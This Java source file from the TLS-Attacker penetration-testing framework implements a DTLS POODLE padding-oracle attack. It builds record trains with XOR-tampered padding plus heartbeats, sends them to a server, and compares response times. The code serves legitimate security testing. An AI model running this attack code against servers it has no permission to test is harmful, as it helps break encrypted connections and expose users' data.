/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.DtlsPoodleCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.dtls.record.handlers.RecordHandler;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.messages.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.messages.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.messages.HeartbeatMessage;
import de.rub.nds.tlsattacker.dtls.record.messages.Record;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.RandomHelper;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes a poodle attack. It logs an error in case the tested server is
 * vulnerable to poodle.
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class DtlsPoodleAttack extends Attacker<DtlsPoodleCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(DtlsPoodleAttack.class);

    private TlsContext tlsContext;

    private RecordHandler recordHandler;

    private List<ProtocolMessage> protocolMessages;

    public DtlsPoodleAttack(DtlsPoodleCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
	recordHandler = (RecordHandler) tlsContext.getRecordHandler();

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	protocolMessages = trace.getProtocolMessages();

	workflowExecutor.executeWorkflow();

	List<byte[]> attackTrain = createAttackMessageTrain(config.getTrainMessageSize(), config.getMessagesPerTrain(),
		ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
	List<byte[]> validTrain = createValidMessageTrain(config.getTrainMessageSize(), config.getMessagesPerTrain());

	try {
	    for (byte[] record : attackTrain) {
		transportHandler.sendData(record);
	    }
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}

	long startNanos = System.nanoTime();

	try {
	    transportHandler.fetchData();
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}

	long endNanos = System.nanoTime();

	LOGGER.info("Time taken for the server to respond (attack train):" + (endNanos - startNanos));

	try {
	    for (byte[] record : validTrain) {
		transportHandler.sendData(record);
	    }
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}

	startNanos = System.nanoTime();

	try {
	    transportHandler.fetchData();
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}

	endNanos = System.nanoTime();

	LOGGER.info("Time taken for the server to respond (valid train):" + (endNanos - startNanos));

	closeDtlsConnectionGracefully(transportHandler);

	transportHandler.closeConnection();
    }

    private List<byte[]> createAttackMessageTrain(int l, int n, VariableModification<byte[]> modifier) {
	List<byte[]> train = new ArrayList<>();
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	byte[] messageData = new byte[l - 13];
	ModifiableByteArray padding = new ModifiableByteArray();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	Record record;

	padding.setModification(modifier);
	RandomHelper.getRandom().nextBytes(messageData);
	apMessage.setData(messageData);

	for (int i = 0; i < n; i++) {
	    record = new Record();
	    record.setPadding(padding);
	    records.add(record);
	    train.add(recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records));
	    records.remove(0);
	}

	HeartbeatMessage hbMessage = new HeartbeatMessage();

	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
	records.add(new Record());

	train.add(recordHandler.wrapData(messageData, ProtocolMessageType.HEARTBEAT, records));

	return train;
    }

    private List<byte[]> createValidMessageTrain(int l, int n) {
	List<byte[]> train = new ArrayList<>();
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	byte[] messageData = new byte[l - 13];
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);

	RandomHelper.getRandom().nextBytes(messageData);
	apMessage.setData(messageData);

	for (int i = 0; i < n; i++) {
	    records.add(new Record());
	    train.add(recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records));
	    records.remove(0);
	}

	HeartbeatMessage hbMessage = new HeartbeatMessage();

	messageData = hbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();
	records.add(new Record());

	train.add(recordHandler.wrapData(messageData, ProtocolMessageType.HEARTBEAT, records));

	return train;
    }

    private void closeDtlsConnectionGracefully(TransportHandler transportHandler) {
	AlertMessage closeNotify = new AlertMessage();
	closeNotify.setConfig(AlertLevel.FATAL, AlertDescription.CLOSE_NOTIFY);
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	records.add(new Record());

	try {
	    transportHandler.sendData(recordHandler.wrapData(closeNotify.getProtocolMessageHandler(tlsContext)
		    .prepareMessage(), ProtocolMessageType.ALERT, records));
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}
    }
}
